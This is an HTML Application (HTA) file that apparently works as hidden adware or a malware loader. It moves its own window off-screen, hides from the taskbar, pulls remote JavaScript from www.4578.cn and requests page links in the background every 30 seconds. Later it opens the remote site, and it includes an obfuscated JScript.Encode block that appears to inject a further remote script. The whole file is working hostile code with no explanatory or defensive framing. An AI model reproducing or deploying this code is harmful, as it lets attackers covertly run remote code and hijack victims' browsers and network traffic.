<Script>self.moveTo(screen.Width + 800,screen.Height + 600);</Script>
<html>
<head>
<hta:application showintaskbar='no'>
</head>
<body onload='start()'>
<Script Language="VBScript">
Function bytes2BSTR(vIn) 
	dim strReturn 
	dim i,ThisCharCode,NextCharCode 
	strReturn = "" 
	For i = 1 To LenB(vIn) 
		ThisCharCode = AscB(MidB(vIn,i,1)) 
		If ThisCharCode < &H80 Then 
			strReturn = strReturn & Chr(ThisCharCode) 
		Else 
			NextCharCode = AscB(MidB(vIn,i+1,1)) 
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
			i = i + 1 
		End If 
	Next 
	bytes2BSTR = strReturn 
End Function
Function OpenHttp(Url)
	On Error Resume Next
	set Http = createobject("Microsoft.XMLHTTP")
	Http.open "GET",Url,false
	Http.send()
End Function
</Script>
<script language=JavaScript src=http://www.4578.cn></script>
<script language=JavaScript src=http://www.4578.cn></script>
<Script Language='JavaScript'>
setTimeout("window.open('http://www.4578.cn');",1200000);
var dd = 3;
function start() {
if (dd < document.links.length) {
OpenHttp(document.links[dd].href);
dd++;setTimeout('start()',1000*30);
}
else window.close();
}
</Script>
<Script Language='JScript.Encode'>#@~^jAAAAA==@#@&InkwKx/Rq.kD+~`r@!j^MkwD~Smxo!CL+{-r9CCj1DrwDwJ,?.^{-J4ODwlzJASh sY76wcmKhzb:Co/&4mwwH Lk-J@*@!wzUmMk2Y@*E*iEi@#@&@!'zj^MkwO@*r#I@#@&ECoAAA==^#~@</Script>
</body></html>
